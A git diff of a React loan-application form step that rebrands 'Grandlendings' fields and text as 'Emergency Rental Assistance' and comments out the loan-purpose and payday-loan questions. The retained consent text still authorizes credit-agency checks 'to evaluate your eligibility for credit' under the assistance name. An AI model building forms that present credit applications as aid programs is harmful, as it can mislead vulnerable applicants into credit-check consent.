@@ -18,16 +18,16 @@ const LoanProcessSix = ({ step, setStep }) => {
       militaryStatus,
       bankruptcyHistory,
       paydayLoanHistory,
-      GrandlendingsSource,
-      GrandlendingsSourceOther,
+      EmergencyRentalAssistanceSource,
+      EmergencyRentalAssistanceSourceOther,
     } = formData;
     const newErrors = {};
 
-    if (!loanPurpose) {
-      newErrors.loanPurpose = "Loan purpose is required.";
-    } else if (loanPurpose === "Other" && !loanPurposeOther) {
-      newErrors.loanPurposeOther = "Please specify the loan purpose.";
-    }
+    // if (!loanPurpose) {
+    //   newErrors.loanPurpose = "Loan purpose is required.";
+    // } else if (loanPurpose === "Other" && !loanPurposeOther) {
+    //   newErrors.loanPurposeOther = "Please specify the loan purpose.";
+    // }
 
     if (!militaryStatus) {
       newErrors.militaryStatus = "Military status is required.";
@@ -37,15 +37,19 @@ const LoanProcessSix = ({ step, setStep }) => {
       newErrors.bankruptcyHistory = "Bankruptcy history is required.";
     }
 
-    if (!paydayLoanHistory) {
-      newErrors.paydayLoanHistory = "Payday loan history is required.";
-    }
+    // if (!paydayLoanHistory) {
+    //   newErrors.paydayLoanHistory = "Payday loan history is required.";
+    // }
 
-    if (!GrandlendingsSource) {
-      newErrors.GrandlendingsSource = "Source of Grandlendings is required.";
-    } else if (GrandlendingsSource === "Other" && !GrandlendingsSourceOther) {
-      newErrors.GrandlendingsSourceOther =
-        "Please specify the source of Grandlendings.";
+    if (!EmergencyRentalAssistanceSource) {
+      newErrors.EmergencyRentalAssistanceSource =
+        "Source of EmergencyRentalAssistance is required.";
+    } else if (
+      EmergencyRentalAssistanceSource === "Other" &&
+      !EmergencyRentalAssistanceSourceOther
+    ) {
+      newErrors.EmergencyRentalAssistanceSourceOther =
+        "Please specify the source of EmergencyRentalAssistance.";
     }
 
     setErrors(newErrors);
@@ -67,7 +71,7 @@ const LoanProcessSix = ({ step, setStep }) => {
   return (
     <>
       <div className="w-full p-6">
-        <h2 className="capitalize font-bold text-2xl mb-8 text-center">
+        {/* <h2 className="capitalize font-bold text-2xl mb-8 text-center">
           Loan Purpose
         </h2>
         <label
@@ -99,7 +103,7 @@ const LoanProcessSix = ({ step, setStep }) => {
         </select>
         {errors.loanPurpose && (
           <p className="text-red-500 text-sm mt-1">{errors.loanPurpose}</p>
-        )}
+        )} */}
 
         {formData.loanPurpose === "Other" && (
           <input
@@ -187,7 +191,7 @@ const LoanProcessSix = ({ step, setStep }) => {
             {errors.bankruptcyHistory}
           </p>
         )}
-
+        {/* 
         <label
           className="block text-gray-700 font-semibold mb-2 mt-7"
           htmlFor="paydayLoanHistory"
@@ -224,19 +228,19 @@ const LoanProcessSix = ({ step, setStep }) => {
           <p className="text-red-500 text-sm mt-1">
             {errors.paydayLoanHistory}
           </p>
-        )}
+        )} */}
 
         <label
           className="block text-gray-700 font-semibold mb-2 mt-7"
-          htmlFor="GrandlendingsSource"
+          htmlFor="EmergencyRentalAssistanceSource"
         >
-          Where did you hear about Grandlendings?
+          Where did you hear about Emergency Rental Assistance?
         </label>
         <select
           className="w-full border border-gray-300 rounded-lg pl-3 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none"
-          name="GrandlendingsSource"
-          id="GrandlendingsSource"
-          value={formData.GrandlendingsSource}
+          name="EmergencyRentalAssistanceSource"
+          id="EmergencyRentalAssistanceSource"
+          value={formData.EmergencyRentalAssistanceSource}
           onChange={handleChange}
           required
         >
@@ -251,27 +255,27 @@ const LoanProcessSix = ({ step, setStep }) => {
           <option value="Repeat Customer">Repeat Customer</option>
           <option value="SMS Marketing">SMS Marketing</option>
         </select>
-        {errors.GrandlendingsSource && (
+        {errors.EmergencyRentalAssistanceSource && (
           <p className="text-red-500 text-sm mt-1">
-            {errors.GrandlendingsSource}
+            {errors.EmergencyRentalAssistanceSource}
           </p>
         )}
 
-        {formData.GrandlendingsSource === "Other" && (
+        {formData.EmergencyRentalAssistanceSource === "Other" && (
           <input
             className="w-full border border-gray-300 rounded-lg pl-3 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none mt-3"
             type="text"
-            name="GrandlendingsSourceOther"
-            id="GrandlendingsSourceOther"
-            value={formData.GrandlendingsSourceOther}
+            name="EmergencyRentalAssistanceSourceOther"
+            id="EmergencyRentalAssistanceSourceOther"
+            value={formData.EmergencyRentalAssistanceSourceOther}
             onChange={handleChange}
             placeholder="Please specify"
-            required={formData.GrandlendingsSource === "Other"}
+            required={formData.EmergencyRentalAssistanceSource === "Other"}
           />
         )}
-        {errors.GrandlendingsSourceOther && (
+        {errors.EmergencyRentalAssistanceSourceOther && (
           <p className="text-red-500 text-sm mt-1">
-            {errors.GrandlendingsSourceOther}
+            {errors.EmergencyRentalAssistanceSourceOther}
           </p>
         )}
 
@@ -279,14 +283,14 @@ const LoanProcessSix = ({ step, setStep }) => {
           By clicking 'Next' below you are agreeing to the following:
           <br />
           <br />
-          1. You are officially continuing your loan application for
-          Grandlendings; and
+          1. You are officially continuing your application for Emergency Rental
+          Assistance and
           <br />
           <br />
-          2. You are providing authorization to Grandlendings under the Fair
-          Credit Reporting Act to use information obtained from credit reporting
-          agencies to verify your information for identity verification purposes
-          and to evaluate your eligibility for credit.
+          2. You are providing authorization to Emergency Rental Assistance
+          under the Fair Credit Reporting Act to use information obtained from
+          credit reporting agencies to verify your information for identity
+          verification purposes and to evaluate your eligibility for credit.
         </p>
 
         <div className="flex justify-between mt-7">
